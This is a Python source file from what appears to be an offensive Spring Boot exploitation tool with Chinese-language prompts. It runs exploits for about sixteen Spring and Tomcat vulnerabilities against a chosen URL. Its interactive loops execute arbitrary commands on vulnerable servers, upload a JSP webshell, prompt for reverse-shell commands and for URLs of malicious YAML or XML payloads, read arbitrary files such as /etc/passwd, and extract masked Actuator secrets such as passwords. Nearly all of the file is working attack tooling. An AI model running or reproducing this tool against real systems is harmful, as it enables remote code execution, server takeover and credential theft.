#!/usr/bin/env python
# coding=utf-8
  ################
 #   AabyssZG   #
################

import sys

from termcolor import cprint

from inc import exploits
from inc.common import exit_interrupt


def run_jeespring(url, proxies, header_new):
    cprint("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======", "green")
    result = exploits.check_jeespring_2023(url, proxies, header_new)
    if result:
        cprint("[+] Payload已经发送，成功上传JSP", "red")
        cprint(f'[+] {url} 存在2023JeeSpring任意文件上传漏洞，Poc地址如下：', "red")
        cprint(result["poc"] + '\n', "red")
    else:
        cprint("[-] 2023JeeSpring任意文件上传漏洞不存在\n", "yellow")


def run_cve_2022_22947(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2022-22947漏洞利用======", "green")
    result = exploits.check_cve_2022_22947(url, proxies, header_new)
    if not result:
        cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
        return
    cprint(f"[+] {result['os']}的Payload已经输出，回显结果如下：", "red")
    print('\n')
    print(result["text"])
    print('\n')
    print("[+] 执行命令模块（输入exit退出）")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit()
        cprint(exploits.exec_cve_2022_22947(url, cmd, proxies, header_new), "green")
        print('\n')


def run_cve_2022_22963(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
    if not exploits.check_cve_2022_22963(url, proxies, header_new):
        cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
        return
    cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞\n', "red")
    cmd = input("[+] 请输入反弹shell或ping的命令（无回显）>>> ")
    if exploits.exec_cve_2022_22963(url, cmd, proxies, header_new):
        cprint(f'[+] {url} 命令执行成功，请检查是否收到回连\n', "red")
    else:
        cprint("[-] 命令执行失败\n", "yellow")


def run_cve_2022_22965(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2022-22965漏洞利用======", "green")
    result = exploits.check_cve_2022_22965(url, proxies, header_new)
    if not result:
        cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/shell.jsp?pwd=tomcat&cmd=命令] \n", "yellow")
        return
    shell_url = result["shell"]
    cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + shell_url + "?pwd=tomcat&cmd=whoami", "red")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit(0)
        output = exploits.exec_cve_2022_22965(shell_url, cmd, proxies)
        if output is None:
            cprint("[-] 重发包返回状态码500，请手动尝试利用WebShell：shell.jsp?pwd=tomcat&cmd=whoami\n", "yellow")
            break
        cprint(output, "green")


def run_cve_2021_21234(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2021-21234漏洞测试======", "green")
    result = exploits.check_cve_2021_21234(url, proxies, header_new)
    if result:
        cprint(f"[+] 发现Spring Boot目录遍历漏洞且系统为{result['os']}，Poc路径如下：", "red")
        for poc_url in result["pocs"]:
            cprint(poc_url, "red")
        print()
    else:
        cprint("[-] 未发现Spring Boot目录遍历漏洞\n", "yellow")


def run_snakeyaml(url, proxies, header_new):
    cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======", "green")
    version = exploits.check_snakeyaml(url, proxies, header_new)
    if not version:
        cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
        return
    cprint(f"[+] 发现SnakeYAML-RCE漏洞，版本为Spring {version}", "red")
    evil_url = input("[+] 请输入恶意yaml所在的URL（如：http://chybeta.com/example.yml）>>> ").strip()
    if exploits.exploit_snakeyaml(url, version, evil_url, proxies, header_new):
        cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
    else:
        cprint("[-] 恶意yaml加载失败\n", "yellow")


def run_eureka(url, proxies, header_new):
    cprint("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======", "green")
    if not exploits.check_eureka(url, proxies, header_new):
        cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
        return
    selectd = input("\n[+] 可能存在Eureka_Xstream反序列化漏洞，因该漏洞可能会破坏业务，是否要发送Exploit（Y/N）: ")
    if selectd != "Y":
        cprint("[.] 已经手动取消发送该Exploit\n", "yellow")
        return
    version = exploits.verify_eureka(url, proxies, header_new)
    if not version:
        cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
        return
    cprint(f"[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring {version}", "red")
    evil_url = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ").strip()
    if exploits.exploit_eureka(url, version, evil_url, proxies, header_new):
        cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
    else:
        cprint("[-] 恶意xml加载失败\n", "yellow")


def run_jolokia(url, proxies, header_new):
    cprint("======开始对目标URL进行Jolokia系列RCE漏洞测试======", "green")
    result = exploits.check_jolokia(url, proxies, header_new)
    if not result:
        cprint("[-] Jolokia系列RCE漏洞不存在\n", "yellow")
        return
    if result["type"] == "logback":
        cprint(f'[+] {url} 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：', "red")
    elif result["type"] == "realm":
        cprint(f'[+] {url} 存在Jolokia-Realm-JNDI-RCE漏洞，Poc地址如下：', "red")
    else:
        cprint(f'[.] 未发现jolokia/list路径存在关键词，请手动验证：', "yellow")
    cprint(result["poc"] + '\n', "red")
    selectd = input("[+] 是否尝试通过Jolokia的getProperty读取Actuator脱敏(******)属性的明文（Y/N）: ")
    if selectd != "Y":
        return
    masked = exploits.find_masked_env_properties(url, proxies, header_new)
    if masked:
        cprint("[+] 在env端点发现以下被脱敏(******)的属性：", "red")
        for key in masked:
            cprint("    " + key, "red")
    else:
        cprint("[.] 未在env端点发现脱敏属性，可手动输入属性名尝试（如security.user.password）", "yellow")
    while 1:
        prop = input("[+] 请输入要读取明文的属性名（输入exit退出）>>> ").strip()
        if prop == "exit":
            return
        if not prop:
            continue
        value = exploits.exploit_jolokia_get_property(url, prop, proxies, header_new)
        if value is not None:
            cprint(f"[+] {prop} = {value}\n", "red")
        else:
            cprint("[-] 未能读取该属性明文（MBean不可用或属性不存在）\n", "yellow")


def run_cve_2018_1273(url, proxies, header_new):
    cprint("======开始对目标URL进行Spring_Data_Commons远程命令执行漏洞测试======", "green")
    if not exploits.check_cve_2018_1273(url, proxies, header_new):
        cprint("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n", "yellow")
        return
    cprint("[+] 发现Spring_Data_Commons远程命令执行漏洞：", "red")
    cprint('漏洞存在路径为 ' + url + 'users\n', "red")
    print("[+] 执行命令模块（输入exit退出）")
    choose = input("[+] 总共有两种Payload，请输入1或者2>>> ")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit(0)
        if exploits.exec_cve_2018_1273(url, cmd, choose, proxies, header_new):
            cprint('[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n', "red")


def run_cve_2025_41243(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2025-41243漏洞利用======", "green")
    result = exploits.check_cve_2025_41243(url, proxies, header_new)
    if not result:
        cprint("[-] CVE-2025-41243漏洞不存在\n", "yellow")
        return
    cprint("[+] Payload已经输出，回显结果如下：", "red")
    print('\n')
    print(result["text"])
    print('\n')
    print("[+] 设置环境变量模块（输入exit退出）")
    while 1:
        do = input("[+] 输入1来设置环境变量，输入2来读取任意文件>>> ")
        if do == "exit":
            sys.exit()
        if do == "1":
            key = input("[+] 请输入要设置的环境的键>>> ")
            if key == "exit":
                sys.exit()
            value = input("[+] 请输入要设置的环境的值>>> ")
            cprint(exploits.exec_41243_setenv(url, key, value, proxies, header_new), "green")
            print('\n')
        elif do == "2":
            is_windows = input("[+] 目标是否为Windows系统？（y/n）>>> ")
            if is_windows == 'y':
                file_path = input("[+] 请输入要读取的文件路径（如C:\\Windows\\win.ini）>>> ")
            else:
                file_path = input("[+] 请输入要读取的文件路径（如/etc/passwd）>>> ")
            cprint(exploits.exec_41243_readfile(url, file_path, is_windows == 'y', proxies, header_new), "green")
            print('\n')


def run_cve_2024_37084(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2024-37084漏洞利用======", "green")
    if not exploits.check_cve_2024_37084(url, proxies, header_new):
        cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")
        return
    cprint("[+] CVE-2024-37084远程命令执行漏洞可能存在，请输入dnslog提供的域名进一步验证\n", "red")
    dnslog = input("[+] 请输入DNSLOG的域名，或是恶意payload的地址>>> ").strip()
    if dnslog.startswith("http://"):
        dnslog = dnslog[7:]
    if exploits.exploit_cve_2024_37084(url, dnslog, proxies, header_new):
        cprint(f"[+] 目标 {url} 存在CVE-2024-37084远程命令执行漏洞，已成功触发DNSLOG", "red")
        cprint(f"[+] 请前往DNSLOG平台查看是否有记录回连，并考虑使用https://github.com/artsploit/yaml-payload进行进一步RCE利用", "red")
        cprint(f"[+] 将请求yaml-payload的地址填到原本dnslog位置即可\n", "red")
    else:
        cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")


def run_cve_2025_22235(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2025-22235漏洞测试======", "green")
    hits = exploits.check_cve_2025_22235(url, proxies, header_new)
    if hits:
        cprint("[+] 发现 /null/** 路径被应用接管，可能存在EndpointRequest鉴权绕过：", "red")
        for hit in hits:
            cprint(f"[+] {hit['path']} 状态码为 {hit['status']}", "red")
        cprint("[+] 请人工确认 /null/** 下是否存在本应鉴权的敏感资源\n", "red")
    else:
        cprint("[-] 未发现CVE-2025-22235漏洞特征\n", "yellow")


def run_cve_2025_24813(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2025-24813(Tomcat partial PUT)漏洞测试======", "green")
    result = exploits.check_cve_2025_24813(url, proxies, header_new)
    if not result:
        cprint("[-] 目标未开放PUT方法，不存在CVE-2025-24813利用条件\n", "yellow")
        return
    cprint(f"[+] 目标允许PUT方法（上传返回状态码 {result['put_status']}）", "red")
    if result["write"]:
        cprint("[+] 测试文件已成功写入并回读，确认DefaultServlet开启写入！", "red")
        cprint("[+] 若目标同时开启文件会话持久化(PersistentManager+FileStore)且存在反序列化利用链，可进一步RCE", "red")
        cprint("[+] 建议使用Java Chains/ysoserial生成序列化Payload进行深度利用\n", "red")
    else:
        cprint(f"[.] PUT请求被接受但未能回读文件（可能为partial PUT临时文件机制），请人工深入验证： {result['file']}\n", "yellow")


def run_cve_2026_59378(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2026-59378漏洞测试======", "green")
    result = exploits.check_cve_2026_59378(url, proxies, header_new)
    if not result:
        cprint("[-] 未发现CVE-2026-59378漏洞特征\n", "yellow")
        return
    for hit in result["hits"]:
        cprint(f"[+] POST {hit['path']} 状态码为 {hit['status']}", "red")
        if hit["same_body"]:
            cprint("[.] 注意：POST与GET响应内容一致，可能是同一个宽松handler，信号较弱", "yellow")
    if result["secured"]:
        cprint("[+] 已确认目标启用默认鉴权（受保护路径返回401/403），health路径却放行非GET请求", "red")
        cprint("[+] 若该路径同时映射了Jersey(JAX-RS)业务资源，未认证请求可直达资源，建议人工深入验证\n", "red")
    else:
        cprint("[.] 注意：未检测到目标启用默认鉴权（受保护路径未返回401/403）", "yellow")
        cprint("[.] 上述结果更可能是业务自定义的公开health端点或宽松路由，属正常响应而非鉴权绕过，请人工甄别\n", "yellow")


def run_cve_2026_47884(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2026-47884(XsltView SSRF/RCE)漏洞测试======", "green")
    result = exploits.check_cve_2026_47884(url, proxies, header_new)
    if not result:
        cprint("[-] 未发现XsltView特征（目标可能未使用XsltView或未开启通配视图渲染）\n", "yellow")
        return
    cprint(f"[+] 在 {result['endpoint']} 发现XSLT错误特征，目标使用XsltView进行视图渲染", "red")
    if result["lfi"]:
        cprint(f"[+] 确认可通过视图名读取任意文件（系统为{result['os']}），Poc地址如下：", "red")
        cprint(result["poc"], "red")
        cprint("[+] 可进一步托管恶意XSLT样式表实现SSRF/RCE（Xalan Java扩展）\n", "red")
    else:
        cprint("[.] 未能通过视图名读取文件，建议人工尝试SSRF/RCE载荷\n", "yellow")


def run_whitelabel_spel(url, proxies, header_new):
    cprint("======开始对目标URL进行Whitelabel Error Page SpEL RCE漏洞测试======", "green")
    result = exploits.check_whitelabel_spel(url, proxies, header_new)
    if not result:
        cprint("[-] 未发现Whitelabel Error Page SpEL RCE漏洞\n", "yellow")
        return
    cprint(f"[+] {url} 存在Whitelabel Error Page SpEL RCE漏洞", "red")
    cprint(f"[+] 注入点：{result['path'] or '/'} 的 {result['param']} 参数，Poc地址如下：", "red")
    cprint(result["poc"] + '\n', "red")
    print("[+] 执行命令模块（无回显，输入exit退出）")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit(0)
        status = exploits.exec_whitelabel_spel(url, result["path"], result["param"], cmd, proxies, header_new)
        if status is not None:
            cprint(f'[+] 该Payload已经打出（HTTP {status}），由于该漏洞无回显，请用Dnslog或反弹shell验证\n', "red")
        else:
            cprint("[-] Payload发送失败\n", "yellow")


RUNNERS = {
    1: run_jeespring,
    2: run_cve_2022_22947,
    3: run_cve_2022_22963,
    4: run_cve_2022_22965,
    5: run_cve_2021_21234,
    6: run_snakeyaml,
    7: run_eureka,
    8: run_jolokia,
    9: run_cve_2018_1273,
    10: run_cve_2025_41243,
    11: run_cve_2024_37084,
    12: run_cve_2025_22235,
    13: run_cve_2025_24813,
    14: run_cve_2026_59378,
    15: run_cve_2026_47884,
    16: run_whitelabel_spel,
}


def vul(url, proxies, header_new):
    cprint("[+] 目前漏洞库内容如下：", "green")
    for num, (name, _) in exploits.VULNS.items():
        print(f" {num}: {name}")
    choices = exploits.ask_choices("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
    if choices is None:
        print("请不要输入无意义的字符串")
        sys.exit()
    for choice in choices:
        runner = RUNNERS.get(choice)
        if runner:
            try:
                runner(url, proxies, header_new)
            except KeyboardInterrupt:
                exit_interrupt()
        else:
            print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
            break
    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
    sys.exit()
